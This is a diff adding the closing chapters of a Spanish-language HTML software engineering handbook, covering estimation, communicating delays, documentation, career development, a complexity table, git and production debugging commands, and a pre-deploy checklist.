+  • Hay un bug en producción que requiere atención urgente
+
+  Técnica de estimación honesta: Three-Point Estimation
+  ┌─────────────────────────────────────────────────────────┐
+  │  O = Optimista: todo sale perfecto (10%)               │
+  │  M = Más probable: condiciones normales (60%)          │
+  │  P = Pesimista: murphy's law activo (30%)              │
+  │                                                         │
+  │  Estimación = (O + 4M + P) / 6                         │
+  │                                                         │
+  │  Ejemplo: "Integrar el sistema de pagos"               │
+  │  O = 3 días, M = 8 días, P = 20 días                   │
+  │  Estimación = (3 + 32 + 20) / 6 = 9.2 días            │
+  │                                                         │
+  │  Comunicar como rango: "Entre 8 y 15 días, más         │
+  │  probable cerca de 9. El riesgo principal es la        │
+  │  documentación incompleta del proveedor de pagos."     │
+  └─────────────────────────────────────────────────────────┘
+</code></pre>
+                    </div>
+
+                    <h4>CÓMO COMUNICAR RETRASOS: LA CONVERSACIÓN DIFÍCIL</h4>
+                    <pre data-lang="markdown"><code><span class="cm"><!-- Plantilla para comunicar que una estimación fue incorrecta --></span>
+
+**Contexto:** [Qué se está construyendo y para cuándo se prometió]
+
+**Situación actual:** Al investigar el sistema de pagos más en profundidad,
+encontramos que [problema específico]. Esto añade trabajo no anticipado.
+
+**Nueva estimación:** La fecha original era [fecha]. La nueva estimación
+más probable es [nueva fecha], con [X días de delta].
+
+**Por qué cambia:** [Causa específica y honesta — no excusas vagas]
+- La API de Stripe tiene rate limits que requieren implementar backoff
+- El modelo de datos existente necesita una migración adicional
+
+**Opciones:** Para mantener la fecha original, podemos:
+1. Reducir el scope: [qué feature podemos cortar sin impacto crítico]
+2. Añadir recurso: [qué persona adicional podría ayudar con qué parte]
+3. Aceptar el retraso: [impacto real en el negocio de esperar X días más]
+
+¿Cuál prefieren?
+
+<span class="cm"><!-- La clave: comunicar PRONTO (no el día antes del deadline),
+     proponer opciones (no dejar el problema sin solucionar),
+     y dar contexto del impacto real (no solo el delay técnico) --></span>
+</code></pre>
+
+                    <h3>Documentación que se Lee</h3>
+                    <p>La documentación que nadie lee no existe. La documentación que produce valor tiene tres
+                        características:
+                        está cerca del código que describe, responde preguntas que alguien realmente tiene, y tiene un
+                        dueño que la
+                        mantiene actualizada.</p>
+
+                    <div class="cards">
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-gn"></span>README: La puerta de entrada</div>
+                            <p>Qué hace este proyecto en una línea. Cómo correrlo en 5 minutos. Las decisiones de
+                                arquitectura
+                                principales. Los links a la documentación extendida. Si el README no está actualizado,
+                                nada lo estará.
+                            </p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-gn"></span>ADRs: Por qué las cosas son como son
+                            </div>
+                            <p>Architecture Decision Records documentan el razonamiento de las decisiones importantes.
+                                "¿Por qué
+                                usamos MongoDB aquí?" La respuesta está en el ADR, con el contexto del momento en que se
+                                tomó la
+                                decisión.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-gn"></span>Comentarios de código: El por qué, no
+                                el qué</div>
+                            <p>El código dice qué hace. Los comentarios dicen por qué. Si el código necesita un
+                                comentario para
+                                explicar qué hace, probablemente necesita un refactor. Si necesita explicar por qué hace
+                                algo no obvio,
+                                el comentario es invaluable.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-rd"></span>Anti-pattern: Wiki graveyard</div>
+                            <p>Una wiki con 500 páginas donde el 80% está desactualizado. Peor que no tener
+                                documentación: da
+                                respuestas incorrectas con apariencia de corrección. Mejor: menos documentación, toda
+                                actualizada.</p>
+                        </div>
+                    </div>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>Las habilidades de equipo son las que determinan si las buenas prácticas técnicas —
+                            <strong>Clean
+                                Code</strong>, <strong>TDD</strong>, <strong>diseño de API</strong> — se adoptan
+                            consistentemente o solo
+                            cuando el autor tiene tiempo. Los code reviews son el mecanismo de difusión de conocimiento
+                            técnico. Las
+                            estimaciones honestas son la interface entre el equipo técnico y las decisiones de negocio.
+                            Sin estas
+                            habilidades, el conocimiento técnico queda atrapado en silos.
+                        </p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 12: DESARROLLO PROFESIONAL
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap12">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 12</span>
+                        <h2>Desarrollo Profesional</h2>
+                    </div>
+
+                    <p>La carrera de un ingeniero de software es una serie de aprendizajes que, si se hacen bien,
+                        produce
+                        compuesto. Cada tecnología aprendida transfiere conocimiento a la siguiente. Cada sistema
+                        construido calibra
+                        mejor el juicio para el siguiente. Pero esto solo ocurre con intencionalidad — no por el simple
+                        paso del
+                        tiempo.</p>
+
+                    <h3>Cómo Aprender Tecnologías Nuevas sin Perderse</h3>
+
+                    <div class="diagram">
+                        <pre><code>
+  El Framework de Aprendizaje de Tecnologías
+
+  NIVEL 1 — CONCEPTUAL (1-2 horas):
+  ¿Qué problema resuelve esta tecnología?
+  ¿Por qué existe? ¿Qué hacía la gente antes?
+  ¿Cuáles son sus trade-offs fundamentales?
+  → Leer el README oficial, el "Why we built X" del autor
+
+  NIVEL 2 — TUTORIAL (1 día):
+  Seguir el tutorial oficial de principio a fin.
+  No saltar secciones. No adaptar a tu caso de uso todavía.
+  El objetivo: entender la forma de pensar de la tecnología,
+  no construir algo útil.
+
+  NIVEL 3 — PROYECTO PEQUEÑO (1 semana):
+  Construir algo pequeño pero completo con la tecnología.
+  Un proyecto que resuelva un problema real (aunque trivial).
+  Encuentras los edge cases que el tutorial no muestra.
+  El debugging te enseña más que el tutorial.
+
+  NIVEL 4 — PRODUCCIÓN (meses):
+  Operar la tecnología bajo carga real.
+  Incidentes, migraciones, degradaciones de performance.
+  Este nivel tarda años en acumularse para una tecnología.
+  La mayoría de los "expertos" reales están en este nivel.
+
+  Trampa común: confundir Nivel 2 con Nivel 4.
+  "Hice el tutorial de Kubernetes" ≠ "sé Kubernetes"
+</code></pre>
+                    </div>
+
+                    <h3>La Diferencia entre Experiencia y Antigüedad</h3>
+
+                    <div class="compare-row">
+                        <div class="compare-col">
+                            <h4>Antigüedad (tiempo sin aprendizaje)</h4>
+                            <ul>
+                                <li>5 años haciendo el mismo tipo de trabajo</li>
+                                <li>Soluciones basadas en "siempre lo hicimos así"</li>
+                                <li>Resistencia a tecnologías o patrones nuevos</li>
+                                <li>Conocimiento profundo de una tecnología específica</li>
+                                <li>No puede explicar el "por qué" de sus decisiones</li>
+                                <li>Su valor es el contexto histórico del sistema</li>
+                            </ul>
+                        </div>
+                        <div class="compare-col">
+                            <h4>Experiencia (ciclos de aprendizaje deliberado)</h4>
+                            <ul>
+                                <li>Múltiples tecnologías, dominios, y tipos de sistema</li>
+                                <li>Decisiones basadas en trade-offs documentados</li>
+                                <li>Adopta lo nuevo cuando el contexto lo justifica</li>
+                                <li>Conocimiento transferible entre tecnologías</li>
+                                <li>Puede defender sus decisiones con razonamiento</li>
+                                <li>Su valor es el criterio aplicable a problemas nuevos</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <h3>Cómo Evaluar si una Empresa Tiene Cultura Técnica Real</h3>
+                    <p>Antes de aceptar una oferta, hay preguntas que revelan la cultura técnica real de una empresa —
+                        no la que
+                        describen en la página de careers.</p>
+
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Pregunta a hacer</th>
+                                    <th>Respuesta que indica cultura sana</th>
+                                    <th>Red flag</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>"¿Cuándo fue el último incidente de producción significativo y qué aprendieron?"
+                                    </td>
+                                    <td class="g">Describen el incidente con detalle, mencionan el postmortem y las
+                                        acciones tomadas</td>
+                                    <td class="r">"No tenemos muchos incidentes" o respuesta vaga sin postmortem</td>
+                                </tr>
+                                <tr>
+                                    <td>"¿Cómo se toman las decisiones técnicas importantes?"</td>
+                                    <td class="g">ADRs, RFCs, discusiones técnicas abiertas, consenso del equipo</td>
+                                    <td class="r">"El arquitecto principal decide" o "el CTO decide"</td>
+                                </tr>
+                                <tr>
+                                    <td>"¿Con qué frecuencia hacen deploys a producción?"</td>
+                                    <td class="g">Daily o múltiples veces al día con feature flags</td>
+                                    <td class="r">"Tenemos una release mensual" o "el deploy es complejo"</td>
+                                </tr>
+                                <tr>
+                                    <td>"¿Cómo manejan la deuda técnica?"</td>
+                                    <td class="g">Parte del sprint, refinamiento continuo, backlog priorizado</td>
+                                    <td class="r">"La vamos a limpiar en el próximo sprint" (desde hace 2 años)</td>
+                                </tr>
+                                <tr>
+                                    <td>"¿Puedo hablar con alguien del equipo fuera del proceso formal?"</td>
+                                    <td class="g">Sí, conectan con un IC (Individual Contributor) sin filtros</td>
+                                    <td class="r">No, o solo con el manager/líder técnico presente</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <h3>Entrevistas Técnicas: Desde Ambos Lados</h3>
+
+                    <div class="cards">
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-bl"></span>Como candidato: mostrar el proceso
+                            </div>
+                            <p>Los entrevistadores no evalúan si llegas a la solución correcta — evalúan cómo piensas.
+                                Preguntar sobre
+                                constraints, mencionar trade-offs en voz alta, y explicar por qué eliges un approach
+                                sobre otro es más
+                                valioso que la solución óptima en silencio.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-bl"></span>Como candidato: preguntar es una señal
+                                de fortaleza
+                            </div>
+                            <p>"¿Qué escala de datos estamos asumiendo?" y "¿Cuáles son los requerimientos de
+                                consistencia?" son
+                                preguntas que hacen los seniors antes de escribir código. Si el entrevistador las ve
+                                como debilidad, eso
+                                dice más sobre el entrevistador que sobre el candidato.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-gn"></span>Como entrevistador: evaluar lo que
+                                importa</div>
+                            <p>La capacidad de memorizar algoritmos es un proxy pobre de la ingeniería real. Mejores
+                                señales: cómo
+                                descompone problemas ambiguos, cómo maneja el feedback durante la entrevista, cómo
+                                razona sobre
+                                trade-offs, y si puede comunicar sus ideas con claridad.</p>
+                        </div>
+                        <div class="card">
+                            <div class="card-title"><span class="dot d-rd"></span>Anti-pattern como entrevistador:
+                                gotcha questions
+                            </div>
+                            <p>Preguntas de trivia que solo alguien que memorizó la respuesta puede responder. Revelan
+                                si el candidato
+                                leyó ese artículo específico — no si puede pensar bien bajo presión. Producen falsos
+                                negativos en
+                                candidatos excelentes y falsos positivos en quienes memorizaron las preguntas de
+                                Glassdoor.</p>
+                        </div>
+                    </div>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>El desarrollo profesional es lo que hace que todos los capítulos anteriores sean
+                            transferibles. Un
+                            ingeniero que aprendió <strong>principios</strong> (SOLID, trade-offs, diseño de sistemas)
+                            puede
+                            aplicarlos a tecnologías nuevas. Uno que solo aprendió <strong>herramientas</strong>
+                            específicas necesita
+                            empezar de cero con cada nueva tecnología. La inversión en fundamentos tiene el mayor
+                            retorno compuesto en
+                            una carrera de ingeniería.</p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     BONUS: REFERENCIA RÁPIDA
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="bonus">
+                    <div class="ch-header">
+                        <span class="ch-badge">BONUS</span>
+                        <h2>Referencia Rápida de Producción</h2>
+                    </div>
+
+                    <h3>Complejidad Algorítmica: Lo que Realmente Importa</h3>
+
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Complejidad</th>
+                                    <th>Nombre</th>
+                                    <th>Ejemplo</th>
+                                    <th>n=1M</th>
+                                    <th>¿Problema?</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td class="g"><strong>O(1)</strong></td>
+                                    <td>Constante</td>
+                                    <td>HashMap get, array index</td>
+                                    <td class="g">1 op</td>
+                                    <td>Nunca</td>
+                                </tr>
+                                <tr>
+                                    <td class="g"><strong>O(log n)</strong></td>
+                                    <td>Logarítmica</td>
+                                    <td>Binary search, B-Tree lookup</td>
+                                    <td class="g">~20 ops</td>
+                                    <td>Nunca</td>
+                                </tr>
+                                <tr>
+                                    <td class="g"><strong>O(n)</strong></td>
+                                    <td>Lineal</td>
+                                    <td>Array scan, linked list</td>
+                                    <td class="y">1M ops</td>
+                                    <td>Rara vez</td>
+                                </tr>
+                                <tr>
+                                    <td class="y"><strong>O(n log n)</strong></td>
+                                    <td>Linearítmica</td>
+                                    <td>Merge sort, heap sort</td>
+                                    <td class="y">~20M ops</td>
+                                    <td>A veces</td>
+                                </tr>
+                                <tr>
+                                    <td class="r"><strong>O(n²)</strong></td>
+                                    <td>Cuadrática</td>
+                                    <td>Bubble sort, nested loops</td>
+                                    <td class="r">1T ops</td>
+                                    <td>Sí — revisar</td>
+                                </tr>
+                                <tr>
+                                    <td class="r"><strong>O(2ⁿ)</strong></td>
+                                    <td>Exponencial</td>
+                                    <td>Recursive fib sin memo</td>
+                                    <td class="r">∞ efectivo</td>
+                                    <td>Siempre</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="callout tip">
+                        <div class="callout-icon"></div>
+                        <p><strong>Regla práctica:</strong> O(n²) con n > 10,000 necesita revisión. O(n) con n > 10M
+                            puede necesitar
+                            optimización. La complejidad importa cuando los datos crecen — siempre preguntar "¿qué tan
+                            grande puede
+                            ser n en producción?"</p>
+                    </div>
+
+                    <h3>Git Avanzado: Los Comandos que Salvan Incidentes</h3>
+
+                    <pre data-lang="bash"><code><span class="cm"># Encontrar qué commit introdujo un bug (bisect)</span>
+git bisect start
+git bisect bad                     <span class="cm"># El commit actual tiene el bug</span>
+git bisect good v2.1.0             <span class="cm"># Este tag estaba bien</span>
+<span class="cm"># Git hace checkout de commits intermedios automáticamente</span>
+<span class="cm"># Tú ejecutas los tests y marcas: git bisect good / git bisect bad</span>
+<span class="cm"># En ~10 pasos encuentra el commit exacto en miles de commits</span>
+git bisect reset                   <span class="cm"># Volver al HEAD original</span>
+
+<span class="cm"># Reescribir historia de commits antes de merge (interactive rebase)</span>
+git rebase -i HEAD~5               <span class="cm"># Últimos 5 commits</span>
+<span class="cm"># pick → mantener, squash → combinar, reword → editar mensaje</span>
+<span class="cm"># fixup → combinar sin mensaje, drop → eliminar</span>
+
+<span class="cm"># Recuperar código eliminado accidentalmente</span>
+git reflog                         <span class="cm"># Historial de todos los HEAD</span>
+git checkout HEAD@{2}              <span class="cm"># Volver al estado de hace 2 operaciones</span>
+
+<span class="cm"># Guardar trabajo en progreso rápidamente</span>
+git stash push -m "WIP: payment form validation"
+git stash list
+git stash pop stash@{0}
+
+<span class="cm"># Cherry-pick: aplicar un commit específico a otra rama</span>
+git cherry-pick abc1234            <span class="cm"># Aplica solo ese commit</span>
+<span class="cm"># Útil para: hotfixes que van a main Y a la rama de release</span>
+
+<span class="cm"># Ver qué línea introdujo un bug (blame con movimiento de código)</span>
+git log -S "bug_function_name" --all   <span class="cm"># Busca en el diff de cada commit</span>
+git log --all --full-history -- "path/to/deleted/file.py"  <span class="cm"># Archivo eliminado</span></code></pre>
+
+                    <h3>El Checklist Antes de ir a Producción</h3>
+
+                    <pre data-lang="markdown"><code>## Pre-deploy Checklist
+
+### Código
+- [ ] Tests pasan localmente Y en CI
+- [ ] No hay console.log / print / debug statements
+- [ ] No hay secrets hardcodeados (API keys, passwords)
+- [ ] Las migraciones de BD son backward compatible (Expand, no Rename)
+- [ ] Los feature flags están configurados correctamente
+
+### Performance
+- [ ] Las nuevas queries tienen EXPLAIN ANALYZE revisado
+- [ ] No hay N+1 queries introducidos
+- [ ] Los endpoints nuevos tienen paginación si retornan listas
+
+### Seguridad
+- [ ] El input del usuario está validado y sanitizado
+- [ ] Los endpoints nuevos tienen autorización correcta
+- [ ] No hay IDOR en accesos a recursos por ID
+
+### Operabilidad
+- [ ] Los nuevos endpoints están en los dashboards de monitoreo
+- [ ] Los errores nuevos tienen alertas configuradas
+- [ ] El runbook está actualizado si el comportamiento cambia
+- [ ] El rollback está planeado: ¿cómo revertir si algo falla?
+
+### Comunicación
+- [ ] El equipo está informado del deploy
+- [ ] El cliente/stakeholder está informado si hay cambio de comportamiento
+- [ ] El on-call sabe qué buscar en las próximas 2 horas post-deploy
+</code></pre>
+
+                    <h3>Comandos de Debugging en Producción</h3>
+
+                    <pre data-lang="bash"><code><span class="cm"># Debugging de red — verificar conectividad</span>
+curl -v -w "\n\nTime: %{time_total}s\nHTTP: %{http_code}\n" https://api.service.com/health
+<span class="cm"># -v muestra headers completos de request y response</span>
+<span class="cm"># -w añade métricas de timing al output</span>
+
+<span class="cm"># Ver conexiones activas de un proceso</span>
+ss -tlnp | grep :8080         <span class="cm"># Qué está escuchando en el puerto 8080</span>
+lsof -p $(pgrep python) -i    <span class="cm"># Conexiones del proceso Python</span>
+
+<span class="cm"># CPU y memoria en tiempo real</span>
+top -p $(pgrep -d',' python)  <span class="cm"># Solo los procesos Python</span>
+vmstat 1 10                    <span class="cm"># Sistema cada 1s durante 10s</span>
+
+<span class="cm"># Logs con contexto — encontrar errores con su contexto</span>
+journalctl -u myapp --since "10 minutes ago" | grep -A 5 "ERROR"
+<span class="cm"># -A 5: 5 líneas después del match (el stack trace)</span>
+
+<span class="cm"># Ver qué hace un proceso en este momento (Linux)</span>
+strace -p $(pgrep myapp) -e trace=network,file  <span class="cm"># Solo syscalls de red y archivo</span>
+
+<span class="cm"># PostgreSQL: queries activas ahora mismo</span>
+<span class="cm"># psql -c "SELECT pid, now() - query_start AS duration, query, state</span>
+<span class="cm">#          FROM pg_stat_activity</span>
+<span class="cm">#          WHERE state != 'idle'</span>
+<span class="cm">#          ORDER BY duration DESC LIMIT 20;"</span>
+
+<span class="cm"># Redis: ver qué comandos se ejecutan en tiempo real</span>
+redis-cli MONITOR | head -100  <span class="cm"># ⚠️ Solo en staging — consume CPU</span>
+redis-cli INFO stats | grep -E "ops_per_sec|hits|misses"</code></pre>
+
+                    <div class="callout axiom">
+                        <div class="callout-icon"></div>
+                        <p><strong>El axioma final del ingeniero:</strong> El código que escribes hoy será mantenido por
+                            alguien —
+                            probablemente tú mismo dentro de seis meses, cuando no recuerdes por qué lo escribiste así.
+                            Escríbelo para
+                            esa persona. La mejor documentación es el código que no necesita documentación porque se
+                            explica solo. La
+                            segunda mejor es el código con los comentarios correctos en los lugares correctos. La
+                            tercera mejor es el
+                            código difícil con comentarios que explican el por qué. No existe la cuarta opción.</p>
+                    </div>
+                </section>
+
+            </div><!-- /content -->
+
+            <footer class="footer">
+                <div>
+                    <span>Software Engineering — Handbook Senior</span>
+                    <br>
+                    <span style="font-family:'Source Sans 3',sans-serif;font-size:11px;color:#8a8278;">Del código que
+                        funciona al
+                        código que multiplica equipos</span>
+                </div>
+                <span>v1.0 — 2024</span>
+            </footer>
+
+        </main>
+    </div><!-- /layout -->
+</body>
+
+</html>
